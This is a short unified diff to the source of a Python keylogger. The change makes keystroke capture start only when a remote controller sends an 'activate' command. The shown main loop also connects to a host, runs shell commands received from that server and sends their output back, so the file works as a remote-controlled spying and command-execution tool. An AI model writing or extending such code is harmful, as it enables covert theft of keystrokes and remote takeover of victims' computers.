@@ -206,7 +206,6 @@ class Keylogger:
 #--------------- MAIN ---------------#
 if __name__ == "__main__":
     keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
-    keylogger.start()
     keylogger.connect_to_host()
 
     while True:
@@ -220,7 +219,10 @@ if __name__ == "__main__":
                     data = utils.execute_command(recv)
                     keylogger.send_to_server(data)
             else:
-                if recv == "exit":
+                if recv == "activate":
+                    keylogger.start()
+                    keylogger.send_to_server("logging activated")
+                elif recv == "exit":
                     keylogger.send_to_server("terminated")
                     keylogger.stop()
                     break
